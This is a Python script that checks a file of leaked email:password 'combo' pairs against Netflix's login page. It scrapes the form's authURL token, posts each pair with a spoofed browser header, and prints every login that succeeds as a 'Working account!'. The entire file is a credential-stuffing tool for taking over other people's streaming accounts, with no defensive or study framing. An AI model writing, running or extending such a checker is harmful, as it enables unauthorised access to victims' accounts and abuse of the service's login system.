import requests
import sys, os
import os.path
import argparse
from bs4 import BeautifulSoup as Soup


def main():

	credFile = input("Enter the combo file name\nwhich should be in same folder as this python script file : ")
	lines = open(credFile, "r")
	line = list(credFile)
	
	for line in lines:
		email=line.split(":")[0]
		password=line.split(":")[1]
		checkPassword(email,password)



def checkPassword(email,password):
	s = requests.Session()
	s.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0'})
	login = s.get("https://www.netflix.com/nl-en/Login")
	soup=Soup(login.text , features="html5lib")

	loginForm = soup.find('form')
	authURL = loginForm.find('input', {'name': 'authURL'}).get('value')
	requestToNetflix = s.post("https://www.netflix.com:443/Login", headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.netflix.com/Login", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}, data={"email": (email), "password": (password), "rememberMeCheckbox": "true", "flow": "websiteSignUp", "mode": "login", "action": "loginAction", "withFields": "email,password,rememberMe,nextPage", "authURL": (authURL), "nextPage": "https://www.netflix.com/browse"})

	logged = requestToNetflix.text.find('name="authURL"')

	if logged == -1:
		print("Working account!","Email: "+email+" Password: "+password)
	 
	
main()